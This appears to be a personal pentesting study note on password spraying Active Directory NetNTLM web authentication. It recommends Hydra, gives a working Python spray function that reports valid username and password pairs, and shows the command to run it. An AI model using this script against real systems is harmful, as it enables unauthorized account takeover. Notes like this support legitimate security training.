Since [[Active Directory]] environments usually detect a lot of authentication attempts, usually password spraying against [[NetNTLM Authenticated Services]] is the best way to proceed.


# 🖊️ Methods

- You can use [[Hydra]] to assist with the password spray.
- You can use a custom script:

```
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

In order to use this you can run it like this:

`python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>`

In the fqdn parameter use the root domain example `google.com` and in the attackurl use `autsite.google.com`


# 📔 Description

- 

##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{26-10-2023}} 19:19
🏷️ tags: #activedirectory #enumeration
---

